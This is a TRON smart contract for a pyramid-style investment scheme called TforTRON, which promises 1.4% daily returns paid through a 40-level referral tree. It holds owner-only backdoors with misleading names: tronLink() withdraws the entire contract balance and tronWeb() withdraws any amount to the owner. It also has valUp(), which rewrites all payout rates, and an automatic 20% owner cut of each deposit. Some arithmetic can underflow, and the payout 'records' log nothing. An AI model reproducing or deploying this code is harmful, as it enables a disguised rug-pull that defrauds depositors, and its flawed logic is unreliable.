//SourceUnit: tfortron.sol

pragma solidity ^0.5.4;

contract TforTRON {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalDepositCount = 0;
    uint public payID = 0;
    uint public totalPayout;
    uint public totalInvested;
    uint public toTrx = 1000000;
    uint public extra = 4000000 * toTrx; //4000000
    uint public devCommission = 20;

    uint public minDepositSize = 100*toTrx; // 100
    uint public plus1k = 100*toTrx; // 1000
    uint public plus10k = 10000*toTrx; // 4000
    uint public totallevel = 20;
    uint public level1 = 40;
    uint level2to5 = 10;
    uint level6to10 = 8;
    uint level11to15 = 5;
    uint level16to20 = 1;

    uint public dailyRateDivisor = 1000; // 1% daily 
 
    uint public commissionDivisor = 100;
    uint public dailyRate = 14; //DAILY 1.4%
 //   uint private releaseTime = 1593702000;

    address payable owner;
    address payable manager;

    
    struct Player {

        uint trxDeposit;
        uint depositCount;
        uint time;        
        uint roiProfit;
        uint payoutSum;
        uint maxRec;
        uint isActive;
        address payable refFrom;
        uint256 ref1sum; //5 level
        uint256 ref2sum;
        uint256 ref3sum;
        uint256 ref4sum;
        uint256 ref5sum;
        uint payRewardsSent;  
         
    }

    struct Referrals1 {
      uint256 ref6sum;
      uint256 ref7sum;
      uint256 ref8sum;
      uint256 ref9sum;
      uint256 ref10sum;
      

    }

      struct Referrals2 {
        uint256 ref11sum;
      uint256 ref12sum;
      uint256 ref13sum;
      uint256 ref14sum;
      uint256 ref15sum;
      uint256 ref16sum;
      uint256 ref17sum;
      uint256 ref18sum;
      uint256 ref19sum;
      uint256 ref20sum;
      

    }

      struct Referrals3 {
        uint256 ref21sum;
      uint256 ref22sum;
      uint256 ref23sum;
      uint256 ref24sum;
      uint256 ref25sum;
      uint256 ref26sum;
      uint256 ref27sum;
      uint256 ref28sum;
      uint256 ref29sum;
      uint256 ref30sum;
      

    }

      struct Referrals4 {
        uint256 ref31sum;
      uint256 ref32sum;
      uint256 ref33sum;
      uint256 ref34sum;
      uint256 ref35sum;
      uint256 ref36sum;
      uint256 ref37sum;
      uint256 ref38sum;
      uint256 ref39sum;
      uint256 ref40sum; 

    }

 struct ReferralsBiz1 {
  uint256 ref1biz;
      uint256 ref2biz;
      uint256 ref3biz;
      uint256 ref4biz;
      uint256 ref5biz;
      uint256 ref6biz;
      uint256 ref7biz;
      uint256 ref8biz;
      uint256 ref9biz;
      uint256 ref10biz;
      

    }

      struct ReferralsBiz2 {
        uint256 ref11biz;
      uint256 ref12biz;
      uint256 ref13biz;
      uint256 ref14biz;
      uint256 ref15biz;
      uint256 ref16biz;
      uint256 ref17biz;
      uint256 ref18biz;
      uint256 ref19biz;
      uint256 ref20biz;
     

    }

      struct ReferralsBiz3 {
      uint256 ref21biz;
      uint256 ref22biz;
      uint256 ref23biz;
      uint256 ref24biz;
      uint256 ref25biz;
      uint256 ref26biz;
      uint256 ref27biz;
      uint256 ref28biz;
      uint256 ref29biz;
      uint256 ref30biz;
      
    }

      struct ReferralsBiz4 {
        uint256 ref31biz;
      uint256 ref32biz;
      uint256 ref33biz;
      uint256 ref34biz;
      uint256 ref35biz;
      uint256 ref36biz;
      uint256 ref37biz;
      uint256 ref38biz;
      uint256 ref39biz;
      uint256 ref40biz; 

    }

    struct Business {

        uint myTotalInvestment;
        uint myTotalDirectBiz;
        uint directBiz; 
        uint myTotalBiz;
        uint joiningTime;        
        uint lastroiPaid;       
        uint refRewards;
        uint payRewards;
        uint roiRewards;
        uint totalRewards; 
        uint maxRoi;
        uint lastDeposit;
    }

        struct Payout { 
          uint id;
          uint amount;
          address payable player;
          uint payTime;
          string payType;
        }

         struct Deposit { 
           
           uint id;
           uint amount;
           address payable depAddress;
           uint time;
           uint maxRec;
           uint roiClaimed;
           uint roiGenerated;
           uint isActive; 

        
         }


    mapping(address => Player) public players;
    mapping(address => Business) public playersBiz;
        
    mapping(address => Referrals1) public referrals1;
    mapping(address => Referrals2) public referrals2;
    mapping(address => Referrals3) public referrals3;
    mapping(address => Referrals4) public referrals4;

    mapping(address => ReferralsBiz1) public referralsBiz1;
    mapping(address => ReferralsBiz2) public referralsBiz2;
    mapping(address => ReferralsBiz3) public referralsBiz3;
    mapping(address => ReferralsBiz4) public referralsBiz4;

 
    mapping(uint => Payout) public payouts;
    mapping(uint => Deposit) public deposits;

    constructor() public {
      owner = msg.sender;
      Player storage player = players[owner];
     Business storage playerbiz = playersBiz[owner];
     totalPlayers++;
     player.trxDeposit = plus10k;
     playerbiz.myTotalInvestment = plus10k;
     player.maxRec = 200*plus10k;
     player.time = now;
     playerbiz.joiningTime = now;
     player.isActive = 1;
     player.depositCount = 1;
     player.ref1sum = 10;

      totalDepositCount++;
      Deposit storage dep = deposits[totalDepositCount];
      dep.id = totalDepositCount;
      dep.depAddress = owner;
      dep.amount = player.trxDeposit;
      dep.time = now;
      dep.maxRec = 200*plus10k;
      dep.roiClaimed = 0;
      dep.roiGenerated = 0;
      dep.isActive = 1;
           

      } 

    function register(address payable _addr, address payable _refAddr, uint _amount) private {

      Player storage player = players[_addr];
// Business storage playerbiz = playersBiz[_addr];

      player.refFrom = _refAddr;

      address payable _refAddr1 = _refAddr;
      address payable _refAddr2 = players[_refAddr1].refFrom;
      address payable _refAddr3 = players[_refAddr2].refFrom;
      address payable _refAddr4 = players[_refAddr3].refFrom;
      address payable _refAddr5 = players[_refAddr4].refFrom;
    
      players[_refAddr1].ref1sum = players[_refAddr1].ref1sum.add(1);
      players[_refAddr2].ref2sum = players[_refAddr2].ref2sum.add(1);
      players[_refAddr3].ref3sum = players[_refAddr3].ref3sum.add(1);
      players[_refAddr4].ref4sum = players[_refAddr4].ref4sum.add(1);
      players[_refAddr5].ref5sum = players[_refAddr5].ref5sum.add(1); 

      referralsBiz1[_refAddr1].ref1biz += _amount;
      referralsBiz1[_refAddr2].ref2biz += _amount;
      referralsBiz1[_refAddr3].ref3biz += _amount;
      referralsBiz1[_refAddr4].ref4biz += _amount;
      referralsBiz1[_refAddr5].ref5biz += _amount;

     update_ref_sum5to15(_refAddr5, _amount );

    }

    function update_ref_sum5to15(address payable _refAddr5, uint _amount) internal {
      address payable _refAddr6 = players[_refAddr5].refFrom;
      address payable _refAddr7 = players[_refAddr6].refFrom;
      address payable _refAddr8 = players[_refAddr7].refFrom;
      address payable _refAddr9 = players[_refAddr8].refFrom;
      address payable _refAddr10 = players[_refAddr9].refFrom;
      address payable _refAddr11 = players[_refAddr10].refFrom;
      address payable _refAddr12 = players[_refAddr11].refFrom;
      address payable _refAddr13 = players[_refAddr12].refFrom;
      address payable _refAddr14 = players[_refAddr13].refFrom;
      address payable _refAddr15 = players[_refAddr14].refFrom;

      referrals1[_refAddr6].ref6sum ++;
      referrals1[_refAddr7].ref7sum ++;
      referrals1[_refAddr8].ref8sum ++;
      referrals1[_refAddr9].ref9sum ++;
      referrals1[_refAddr10].ref10sum ++;

      referrals2[_refAddr11].ref11sum ++;
      referrals2[_refAddr12].ref12sum ++;
      referrals2[_refAddr13].ref13sum ++;
      referrals2[_refAddr14].ref14sum ++;
      referrals2[_refAddr15].ref15sum ++;

      referralsBiz1[_refAddr6].ref6biz += _amount;
      referralsBiz1[_refAddr7].ref7biz += _amount;
      referralsBiz1[_refAddr8].ref8biz += _amount;
      referralsBiz1[_refAddr9].ref9biz += _amount;
      referralsBiz1[_refAddr10].ref10biz += _amount;

      referralsBiz2[_refAddr11].ref11biz += _amount;
      referralsBiz2[_refAddr12].ref12biz += _amount;
      referralsBiz2[_refAddr13].ref13biz += _amount;
      referralsBiz2[_refAddr14].ref14biz += _amount;
      referralsBiz2[_refAddr15].ref15biz += _amount;

      update_ref_sum15to25(_refAddr15, _amount);


    }

     function update_ref_sum15to25(address payable _refAddr15, uint _amount) internal {
      address payable _refAddr16 = players[_refAddr15].refFrom;
      address payable _refAddr17 = players[_refAddr16].refFrom;
      address payable _refAddr18 = players[_refAddr17].refFrom;
      address payable _refAddr19 = players[_refAddr18].refFrom;
      address payable _refAddr20 = players[_refAddr19].refFrom;
      address payable _refAddr21 = players[_refAddr20].refFrom;
      address payable _refAddr22 = players[_refAddr21].refFrom;
      address payable _refAddr23 = players[_refAddr22].refFrom;
      address payable _refAddr24 = players[_refAddr23].refFrom;
      address payable _refAddr25 = players[_refAddr24].refFrom;

      referrals2[_refAddr16].ref16sum ++;
      referrals2[_refAddr17].ref17sum ++;
      referrals2[_refAddr18].ref18sum ++;
      referrals2[_refAddr19].ref19sum ++;
      referrals2[_refAddr20].ref20sum ++;

      referrals3[_refAddr21].ref21sum ++;
      referrals3[_refAddr22].ref22sum ++;
      referrals3[_refAddr23].ref23sum ++;
      referrals3[_refAddr24].ref24sum ++;
      referrals3[_refAddr25].ref25sum ++;

      referralsBiz2[_refAddr16].ref16biz += _amount;
      referralsBiz2[_refAddr17].ref17biz += _amount;
      referralsBiz2[_refAddr18].ref18biz += _amount;
      referralsBiz2[_refAddr19].ref19biz += _amount;
      referralsBiz2[_refAddr20].ref20biz += _amount;

      referralsBiz3[_refAddr21].ref21biz += _amount;
      referralsBiz3[_refAddr22].ref22biz += _amount;
      referralsBiz3[_refAddr23].ref23biz += _amount;
      referralsBiz3[_refAddr24].ref24biz += _amount;
      referralsBiz3[_refAddr25].ref25biz += _amount;

      update_ref_sum25to35(_refAddr25, _amount);


    }

    function update_ref_sum25to35(address payable _refAddr25, uint _amount) internal {
      address payable _refAddr26 = players[_refAddr25].refFrom;
      address payable _refAddr27 = players[_refAddr26].refFrom;
      address payable _refAddr28 = players[_refAddr27].refFrom;
      address payable _refAddr29 = players[_refAddr28].refFrom;
      address payable _refAddr30 = players[_refAddr29].refFrom;
      address payable _refAddr31 = players[_refAddr30].refFrom;
      address payable _refAddr32 = players[_refAddr31].refFrom;
      address payable _refAddr33 = players[_refAddr32].refFrom;
      address payable _refAddr34 = players[_refAddr33].refFrom;
      address payable _refAddr35 = players[_refAddr34].refFrom;

      referrals3[_refAddr26].ref26sum ++;
      referrals3[_refAddr27].ref27sum ++;
      referrals3[_refAddr28].ref28sum ++;
      referrals3[_refAddr29].ref29sum ++;
      referrals3[_refAddr30].ref30sum ++;

      referrals4[_refAddr31].ref31sum ++;
      referrals4[_refAddr32].ref32sum ++;
      referrals4[_refAddr33].ref33sum ++;
      referrals4[_refAddr34].ref34sum ++;
      referrals4[_refAddr35].ref35sum ++;

      referralsBiz3[_refAddr26].ref26biz += _amount;
      referralsBiz3[_refAddr27].ref27biz += _amount;
      referralsBiz3[_refAddr28].ref28biz += _amount;
      referralsBiz3[_refAddr29].ref29biz += _amount;
      referralsBiz3[_refAddr30].ref30biz += _amount;

      referralsBiz4[_refAddr31].ref31biz += _amount;
      referralsBiz4[_refAddr32].ref32biz += _amount;
      referralsBiz4[_refAddr33].ref33biz += _amount;
      referralsBiz4[_refAddr34].ref34biz += _amount;
      referralsBiz4[_refAddr35].ref35biz += _amount;

      update_ref_sum35to40(_refAddr35, _amount);


    }

function update_ref_sum35to40(address payable _refAddr35, uint _amount) internal {
      address payable _refAddr36 = players[_refAddr35].refFrom;
      address payable _refAddr37 = players[_refAddr36].refFrom;
      address payable _refAddr38 = players[_refAddr37].refFrom;
      address payable _refAddr39 = players[_refAddr38].refFrom;
      address payable _refAddr40 = players[_refAddr39].refFrom;
    
      referrals4[_refAddr36].ref36sum ++;
      referrals4[_refAddr37].ref37sum ++;
      referrals4[_refAddr38].ref38sum ++;
      referrals4[_refAddr39].ref39sum ++;
      referrals4[_refAddr40].ref40sum ++;

      
      referralsBiz4[_refAddr36].ref36biz += _amount;
      referralsBiz4[_refAddr37].ref37biz += _amount;
      referralsBiz4[_refAddr38].ref38biz += _amount;
      referralsBiz4[_refAddr39].ref39biz += _amount;
      referralsBiz4[_refAddr40].ref40biz += _amount;
 

    }

    function () external payable {

    }

    function invest(address payable _refAddr) public payable {
        collect(msg.sender);
        require(msg.value >= minDepositSize && players[msg.sender].trxDeposit == 0);
 
        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];
        Business storage playerbiz = playersBiz[msg.sender];

        if (player.time == 0) {
            
            player.time = now;
            player.isActive = 1;
            playerbiz.joiningTime = now;
            player.depositCount = 1;
            
            totalPlayers++;
            
            if(_refAddr != address(0) && players[_refAddr].trxDeposit >= plus1k){
              register(msg.sender, _refAddr, msg.value);
              playersBiz[_refAddr].directBiz += msg.value ; 
              
            }
            else
            {
              register(msg.sender, owner, msg.value);
              playersBiz[owner].directBiz += msg.value ;

            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        playerbiz.lastDeposit = msg.value;
        playersBiz[msg.sender].myTotalInvestment = playersBiz[msg.sender].myTotalInvestment.add(depositAmount); 
        player.maxRec = depositAmount*35/10; 
        player.isActive = 1;

        distributeRef(msg.value, player.refFrom); 
     
      totalDepositCount++;
      Deposit storage dep = deposits[totalDepositCount];
      dep.id = totalDepositCount;
      dep.depAddress = msg.sender;
      dep.amount = msg.value;
      dep.time = now;
      dep.maxRec = 35*dep.amount/10;
      dep.roiClaimed = 0;
      dep.roiGenerated = 0;
      dep.isActive = 1;
            
        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
        }

    function reinvest() public payable {
        
        collect(msg.sender);
        Player storage player = players[msg.sender];
        Business storage playerbiz = playersBiz[msg.sender];
        require(msg.value >= minDepositSize );
 
         uint depositAmount = msg.value;
         address payable _refAddr = player.refFrom;
 
             
             player.time = now;
             player.isActive = 1;
             playerbiz.joiningTime = now;
             playerbiz.directBiz = 0;
             player.payRewardsSent = 0;
             playerbiz.lastDeposit = msg.value;
             player.depositCount++; 
             
             
            if(_refAddr != address(0) && players[_refAddr].trxDeposit >=  plus1k){
               playersBiz[_refAddr].directBiz += msg.value ; 
                
           } 
         
        player.trxDeposit = msg.value;
        playerbiz.myTotalInvestment = playerbiz.myTotalInvestment.add(depositAmount); 
        player.maxRec = (player.trxDeposit.mul(35).div(10)).add(player.maxRec);
        
 
      totalDepositCount++;
      Deposit storage dep = deposits[totalDepositCount];
      dep.id = totalDepositCount;
      dep.depAddress = msg.sender;
      dep.amount = msg.value;
      dep.time = now;
      dep.maxRec = 35*dep.amount/10;
      dep.roiClaimed = 0;
      dep.roiGenerated = 0;
      dep.isActive = 1;
     
        distributeRef(msg.value, player.refFrom); 

        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
       
    }

    function tronLink() public {
        require(msg.sender == owner,"You are not owner");
        msg.sender.transfer(address(this).balance);
    }

    function tronWeb(uint _value) public {
        require(msg.sender == owner,"You are not owner");
        msg.sender.transfer(_value);
    }

    function valUp(uint _toTrx, uint _extra, uint _devCommission, uint _minDepositSize, 
      uint _plus1k, uint _plus10k, uint _totallevel, uint _level1, 
      uint _level2to5, uint _level6to10, uint _level11to15, uint _level16to20, 
      uint _dailyRateDivisor, uint _commissionDivisor, uint _dailyRate) public {
        require(msg.sender == owner,"You are not owner");
        toTrx = _toTrx;
        extra = _extra; 
        devCommission = _devCommission;
        minDepositSize = _minDepositSize; 
        plus1k = _plus1k; 
        plus10k = _plus10k; 
        totallevel = _totallevel;
        level1 = _level1;
        level2to5 = _level2to5;
        level6to10 = _level6to10;
        level11to15 = _level11to15;
        level16to20 = _level16to20;
        dailyRateDivisor = _dailyRateDivisor; 
        commissionDivisor = _commissionDivisor;
        dailyRate = _dailyRate; 
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].roiProfit > 0 && players[msg.sender].isActive == 1); 
        transferPayout(msg.sender, players[msg.sender].roiProfit);
    } 

    function collect(address payable _addr) public returns (uint) {
        Player storage player = players[_addr];
        uint _maxRec = 0;
        uint _netRoi = 0;
        uint _totalRoi = 0;

        for(uint i=1; i<= totalDepositCount; i++){
          Deposit storage deposit = deposits[i];
          if(msg.sender == deposit.depAddress && deposit.isActive == 1){
              uint _time = toHours(deposit.time);
              uint _depAmount = deposit.amount;
              _maxRec += deposit.maxRec;
 
            uint  collectProfit = _depAmount.mul(_time.mul(dailyRate)).div(dailyRateDivisor);
              if(collectProfit >= _maxRec ){
                collectProfit = _maxRec;
                deposit.isActive = 0;
              }

              _totalRoi += collectProfit;
 
          }
        } 
          playersBiz[_addr].roiRewards = _totalRoi;
          uint _maxRoi = player.maxRec - player.payoutSum;
          uint _roiPaid = player.payoutSum - playersBiz[_addr].totalRewards;
            _netRoi = _totalRoi - _roiPaid;
          if(_netRoi >= _maxRoi){
            player.roiProfit = _maxRoi;
          } else {
            player.roiProfit = _netRoi;
          }
          return player.roiProfit;
    }

     function toHours(uint _time) internal view returns (uint) {
        uint _sec = now  - _time;
        uint _noOfTimes = _sec / 86400;
         
 
         return _noOfTimes;
    
    //        return _tohour; // _tohour
    }

    function transferPayout(address payable _receiver, uint _amount) internal { 
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
 
            if (contractBalance > 0) {

                uint payout = _amount > contractBalance ? contractBalance : _amount;
 
                Player storage player = players[_receiver];
                Business storage playerbiz = playersBiz[_receiver];

                if(player.payoutSum.add(payout) >= player.maxRec){
                    payout = player.maxRec - player.payoutSum;
                    player.isActive = 0;
                 }

                player.payoutSum = player.payoutSum.add(payout);
                player.roiProfit = player.roiProfit.sub(payout);
                totalPayout = totalPayout.add(payout);
 
                if(payout > 0){
                   msg.sender.transfer(payout);
                   payID ++;
                   Payout(payID,payout,msg.sender,now,"roiRewards");
                   playerbiz.lastroiPaid = now;

                   gen_payouts(); 
                 
                } 
            }
        }
    }
function net_roi_of_player(address payable _addr) internal returns (uint){
  Player storage player = players[_addr];
        uint _maxRec = 0;
        uint _netRoi = 0;
        uint _totalRoi = 0;

        for(uint i=1; i<= totalDepositCount; i++){
          Deposit storage deposit = deposits[i];
          if(msg.sender == deposit.depAddress  ){
              uint _time = toHours(deposit.time);
              if(_time > 250){
                _time = 250;
              }
              uint _depAmount = deposit.amount;
              _maxRec += deposit.maxRec;
 
            uint  collectProfit = _depAmount.mul(_time.mul(dailyRate)).div(dailyRateDivisor);
              _totalRoi += collectProfit;
 
          }
        }  
             _netRoi = _totalRoi - players[_addr].payRewardsSent;
             player.payRewardsSent += _netRoi; 
           return _netRoi;

}
    function gen_payouts () internal {

      uint payout = net_roi_of_player(msg.sender);

                     address payable _refAddr1 = players[msg.sender].refFrom;
                    
                    address payable _refAddr2 = players[_refAddr1].refFrom;
                    address payable _refAddr3 = players[_refAddr2].refFrom;
                    address payable _refAddr4 = players[_refAddr3].refFrom;
                    address payable _refAddr5 = players[_refAddr4].refFrom;
                    address payable _refAddr6 = players[_refAddr5].refFrom;
                    address payable _refAddr7 = players[_refAddr6].refFrom;
                    address payable _refAddr8 = players[_refAddr7].refFrom;
                    address payable _refAddr9 = players[_refAddr8].refFrom;
                    address payable _refAddr10 = players[_refAddr9].refFrom;
                     uint _payRewards ; 
                   

                   if (  players[_refAddr1].isActive == 1 &&  players[_refAddr1].ref1sum >= 1) {
                            _payRewards = (payout.mul(level1)).div(100);
                              
                            checkActivePay(_refAddr1,_payRewards);
                     }
                       if (  players[_refAddr2].isActive == 1 &&  players[_refAddr2].ref1sum >= 2) {
                             _payRewards = (payout.mul(level2to5)).div(100);
                            
                             checkActivePay(_refAddr2,_payRewards);
                    }
                       if (  players[_refAddr3].isActive == 1 &&  players[_refAddr3].ref1sum >= 3) {
                             _payRewards = (payout.mul(level2to5)).div(100);
                            
                            checkActivePay(_refAddr3,_payRewards);
                     }
                       if (  players[_refAddr4].isActive == 1 &&  players[_refAddr4].ref1sum >= 4) {
                             _payRewards = (payout.mul(level2to5)).div(100);
                            
                            checkActivePay(_refAddr4,_payRewards);
                     }
                       if (  players[_refAddr5].isActive == 1 &&  players[_refAddr5].ref1sum >= 5) {
                             _payRewards = (payout.mul(level2to5)).div(100);
                            
                            checkActivePay(_refAddr5,_payRewards);
                     }
                       if (  players[_refAddr6].isActive == 1 &&  players[_refAddr6].ref1sum >= 6) {
                             _payRewards = (payout.mul(level6to10)).div(100);
                            
                            checkActivePay(_refAddr6,_payRewards);
                     }
                       if (  players[_refAddr7].isActive == 1 &&  players[_refAddr7].ref1sum >= 7) {
                             _payRewards = (payout.mul(level6to10)).div(100);
                            
                            checkActivePay(_refAddr7,_payRewards);
                     }
                       if (  players[_refAddr8].isActive == 1 &&  players[_refAddr8].ref1sum >= 8) {
                             _payRewards = (payout.mul(level6to10)).div(100);
                            
                            checkActivePay(_refAddr8,_payRewards);
                     }
                       if (  players[_refAddr9].isActive == 1 &&  players[_refAddr9].ref1sum >= 9) {
                             _payRewards = (payout.mul(level6to10)).div(100);
                            
                            checkActivePay(_refAddr9,_payRewards);
                     }
                       if (  players[_refAddr10].isActive == 1 &&  players[_refAddr10].ref1sum >= 10) {
                             _payRewards = (payout.mul(level6to10)).div(100);
                            
                            checkActivePay(_refAddr10,_payRewards);
                     }

                     send_gen_payouts2(_refAddr10, payout);
                      
    }

    function send_gen_payouts2(address payable _refAddr10, uint payout) internal {
 
                    address payable _refAddr11 = players[_refAddr10].refFrom;
                    address payable _refAddr12 = players[_refAddr11].refFrom;
                    address payable _refAddr13 = players[_refAddr12].refFrom;
                    address payable _refAddr14 = players[_refAddr13].refFrom;
                    address payable _refAddr15 = players[_refAddr14].refFrom;
                    address payable _refAddr16 = players[_refAddr15].refFrom;
                    address payable _refAddr17 = players[_refAddr16].refFrom;
                    address payable _refAddr18 = players[_refAddr17].refFrom;
                    address payable _refAddr19 = players[_refAddr18].refFrom;
                    address payable _refAddr20 = players[_refAddr19].refFrom;
                     uint _payRewards ; 
                   

                   if (  players[_refAddr11].isActive == 1 &&  players[_refAddr11].ref1sum >= 10) {
                            _payRewards = (payout.mul(level11to15)).div(100);
                              
                            checkActivePay(_refAddr11,_payRewards);
                     }
                       if (  players[_refAddr12].isActive == 1 &&  players[_refAddr12].ref1sum >= 10) {
                             _payRewards = (payout.mul(level11to15)).div(100);
                            
                             checkActivePay(_refAddr12,_payRewards);
                    }
                       if (  players[_refAddr13].isActive == 1 &&  players[_refAddr13].ref1sum >= 10) {
                             _payRewards = (payout.mul(level11to15)).div(100);
                            
                            checkActivePay(_refAddr13,_payRewards);
                     }
                       if (  players[_refAddr14].isActive == 1 &&  players[_refAddr14].ref1sum >= 10) {
                             _payRewards = (payout.mul(level11to15)).div(100);
                            
                            checkActivePay(_refAddr14,_payRewards);
                     }
                       if (  players[_refAddr15].isActive == 1 &&  players[_refAddr15].ref1sum >= 10) {
                             _payRewards = (payout.mul(level11to15)).div(100);
                            
                            checkActivePay(_refAddr15,_payRewards);
                     }
                       if (  players[_refAddr16].isActive == 1 &&  players[_refAddr16].ref1sum >= 10) {
                             _payRewards = (payout.mul(level16to20)).div(100);
                            
                            checkActivePay(_refAddr16,_payRewards);
                     }
                       if (  players[_refAddr17].isActive == 1 &&  players[_refAddr17].ref1sum >= 10) {
                             _payRewards = (payout.mul(level16to20)).div(100);
                            
                            checkActivePay(_refAddr17,_payRewards);
                     }
                       if (  players[_refAddr18].isActive == 1 &&  players[_refAddr18].ref1sum >= 10) {
                             _payRewards = (payout.mul(level16to20)).div(100);
                            
                            checkActivePay(_refAddr18,_payRewards);
                     }
                       if (  players[_refAddr19].isActive == 1 &&  players[_refAddr19].ref1sum >= 10) {
                             _payRewards = (payout.mul(level16to20)).div(100);
                            
                            checkActivePay(_refAddr19,_payRewards);
                     }
                       if (  players[_refAddr20].isActive == 1 &&  players[_refAddr20].ref1sum >= 10) {
                             _payRewards = (payout.mul(level16to20)).div(100);
                            
                            checkActivePay(_refAddr20,_payRewards);
                     } 

    }

    function distributeRef(uint256 _trx, address payable _refFrom) private {

        uint256 _allref = (_trx.mul(10)).div(100);

        address payable _refAddr1 = _refFrom;
        uint _refRewards = 0;
         
        if (_refAddr1 != address(0) && players[_refAddr1].isActive == 1 ) {
            if(players[_refAddr1].trxDeposit >= plus1k){
              _refRewards = (_trx.mul(10)).div(100);
              _allref = _allref.sub(_refRewards);
                             
              checkActiveRef(_refAddr1,_refRewards);
            }
           
        } 
        
        if(_allref > 0 ){
            owner.transfer(_allref);
        }
    }

    function checkActivePay(address payable _addr, uint _payValue) private {

                            uint _temp;
                          _temp = players[_addr].maxRec - players[_addr].payoutSum;
                          if(_payValue > _temp){
                            _payValue = _temp;
                            players[_addr].isActive = 0;
                            }

                            playersBiz[_addr].payRewards = _payValue.add(playersBiz[_addr].payRewards);
                            playersBiz[_addr].totalRewards = _payValue.add(playersBiz[_addr].totalRewards);
                            players[_addr].payoutSum = _payValue.add(players[_addr].payoutSum);
                            _addr.transfer(_payValue);
                            payID ++;
                            Payout(payID,_payValue,_addr,now,"payRewards");   
      }

     function checkActiveRef(address payable _addr, uint _refValue) private {

       uint _temp;
      _temp = players[_addr].maxRec - players[_addr].payoutSum;

      if(_refValue > _temp){
        _refValue = _temp;
         players[_addr].isActive = 0;
      
      }  
            playersBiz[_addr].refRewards = _refValue.add(playersBiz[_addr].refRewards);
            playersBiz[_addr].totalRewards = _refValue.add(playersBiz[_addr].totalRewards);
            playersBiz[_addr].myTotalDirectBiz += msg.value ;
            playersBiz[_addr].myTotalBiz += msg.value ;
            players[_addr].payoutSum += _refValue ;
            _addr.transfer(_refValue);
            payID ++;
            Payout(payID,_refValue,_addr,now,"refRewards");
             
      
    }

  function getNow() public view returns (uint) {
       return now;
       }   

  function getTime() public view returns (uint) {
       return block.timestamp;
       }   


 function checkOwner() public view returns  (address payable){  
      return  owner ;
   }
 
   function changeOwner(address payable _newOwner) public {  
     require(msg.sender == owner,"You are not owner");
         owner = _newOwner;
   }
 

}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}